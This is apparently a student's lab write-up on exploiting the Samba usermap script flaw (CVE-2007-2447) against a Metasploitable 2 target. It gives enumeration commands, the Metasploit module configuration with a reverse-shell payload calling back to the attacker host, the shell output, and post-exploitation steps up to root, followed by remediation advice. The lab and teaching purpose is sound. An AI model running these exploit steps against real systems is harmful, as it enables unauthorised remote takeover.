# Samba Usermap Script — Remote Code Execution

## Vulnerability Overview

| Field           | Details                                          |
|----------------|--------------------------------------------------|
| **CVE**        | CVE-2007-2447                                    |
| **Service**    | Samba (smbd)                                     |
| **Ports**      | 139/tcp, 445/tcp                                 |
| **Severity**   | 🔴 Critical                                      |
| **Version**    | Samba 3.0.20-Debian                              |
| **MSF Module** | `exploit/multi/samba/usermap_script`             |
| **Payload**    | `cmd/unix/reverse`                               |
| **Auth Required** | ❌ None                                       |

---

## Environment

| Role     | OS               | IP Address       |
|----------|------------------|------------------|
| Attacker | Kali Linux       | 192.168.133.129  |
| Target   | Metasploitable 2 | 192.168.133.128  |

---

## Background

### What is Samba?

Samba allows Linux/Unix systems to communicate with Windows systems using the **SMB/CIFS protocol**.

| Function         | Description                                  |
|-----------------|----------------------------------------------|
| File Sharing    | Share folders/files over a network           |
| Printer Sharing | Share printers across systems                |
| Authentication  | Domain login / Active Directory integration  |
| Remote Access   | Access network resources remotely            |
| Interoperability| Enables Linux ↔ Windows communication        |

### Ports

| Port | Protocol                | Purpose                  |
|------|-------------------------|--------------------------|
| 139  | NetBIOS Session Service | Older SMB communication  |
| 445  | SMB over TCP            | Modern SMB communication |

### Main Samba Components

| Component   | Role                         |
|------------|------------------------------|
| `smbd`     | File/printer sharing daemon  |
| `nmbd`     | NetBIOS name service         |
| `winbindd` | Windows domain integration   |

---

## Vulnerability — Username Map Script RCE

Samba versions **3.0.20 through 3.0.25rc3** contain a critical flaw in the `username map script` configuration option. When this option is enabled, Samba passes the username supplied during authentication directly to `/bin/sh` without sanitization.

An attacker can embed shell metacharacters (e.g. backticks, pipes) inside the username field to inject arbitrary OS commands — **without needing valid credentials**.

**Affected Versions:** Samba 3.0.20 → 3.0.25rc3
**Impact:** Unauthenticated Remote Code Execution as `root`

---

## Step 1 — Reconnaissance (Nmap Scan)

From the earlier Nmap scan, ports 139 and 445 were identified running Samba:

```
139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

The scan reported `3.X - 4.X` — a broad range. The exact version needed to be confirmed before concluding exploitability.

---

## Step 2 — Version Enumeration (smbclient)

The Nmap scan reported a broad version range (`3.X - 4.X`). To identify the exact version, `smbclient` was used to connect anonymously and enumerate shares:

```bash
smbclient -L //192.168.133.128/ -N
```

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
```

**Two things confirmed here:**

1. **Exact version:** `Samba 3.0.20-Debian` — falls within the vulnerable range (3.0.20 → 3.0.25rc3) ✅
2. **Anonymous login successful** — the server allows unauthenticated enumeration, which is itself a misconfiguration (null session access)

This version confirmation was critical before proceeding with exploitation.

---

## Step 3 — Loading the Exploit (Metasploit)

Launched Metasploit and loaded the exploit module:

```bash
msfconsole
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
msf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.133.128
msf exploit(multi/samba/usermap_script) > set LHOST 192.168.133.129
msf exploit(multi/samba/usermap_script) > exploit
```

**Exploit output:**

```
[*] Started reverse TCP handler on 192.168.133.129:4444
[*] Command shell session 1 opened (192.168.133.129:4444 → 192.168.133.128:...)
```

✅ **Reverse shell obtained.**

---

## Step 4 — Post-Exploitation

### OS & Version Information

```bash
cat /etc/issue
```

```
Metasploitable 2 - Build 6
Login with msfadmin/msfadmin to get started
```

```bash
cat /etc/*release
```

Confirmed the target OS and release information.

**Credentials found:**

| Username   | Password   |
|-----------|-----------|
| `msfadmin` | `msfadmin` |

---

### Running Processes

```bash
ps aux
```

Enumerated all running processes on the target to identify active services, daemons, and potential privilege escalation vectors.

---

### Privilege Escalation Check

```bash
sudo -l
```

```
User root may run the following commands on this host:
    (ALL) ALL
```

🔴 **Critical Misconfiguration:** The current shell session already had unrestricted `sudo` privileges — meaning full root access was available without even needing a password.

```bash
sudo su
whoami
# root
```

✅ **Full root access confirmed.**

---

## Attack Flow Summary

```
Nmap scan          →  Ports 139/445 open, Samba detected
       ↓
smbclient -N       →  Anonymous login + Samba 3.0.20-Debian confirmed
       ↓
Load MSF module    →  exploit/multi/samba/usermap_script
       ↓
Set payload        →  cmd/unix/reverse
       ↓
Run exploit        →  Reverse shell opened
       ↓
cat /etc/issue     →  Credentials: msfadmin/msfadmin
       ↓
sudo -l            →  (ALL) ALL — unrestricted sudo
       ↓
sudo su            →  Root shell ✅
```

---

## Impact

- **Unauthenticated RCE** — no credentials needed to trigger the exploit
- **Immediate root-level shell** via reverse TCP connection
- Full filesystem access — read, write, delete any file
- Credential harvesting from system files
- Ability to install persistent backdoors
- Lateral movement and network pivoting
- Complete system compromise

---

## Remediation

| Action | Details |
|--------|---------|
| **Update Samba** | Upgrade to Samba 3.0.25rc4 or later immediately |
| **Disable `username map script`** | Remove or comment out this option in `smb.conf` if not needed |
| **Firewall SMB ports** | Block ports 139 and 445 from external/untrusted networks |
| **Principle of least privilege** | Never allow unrestricted `sudo` for service accounts |
| **Restrict SMB access** | Limit SMB access to trusted hosts only via firewall rules |
| **Monitor SMB logs** | Alert on unusual authentication patterns or shell metacharacters in usernames |

---

## What I Learned

- How Samba works and why ports 139/445 are high-value targets
- Difference between NetBIOS (139) and modern SMB (445)
- How the Username Map Script vulnerability works — shell injection via username field
- Importance of exact version identification before assuming exploitability
- Using `cmd/unix/reverse` payload for a reverse shell via Metasploit
- Extracting credentials from `/etc/issue` and `/etc/*release`
- Using `sudo -l` to check privilege escalation opportunities
- How a single misconfigured `sudo` rule grants full root access

---

## References

- [CVE-2007-2447 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [Rapid7 — Samba Usermap Script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
- [Exploit-DB #16320](https://www.exploit-db.com/exploits/16320)
- [CyLab Academy](https://learn.cylabacademy.org/)
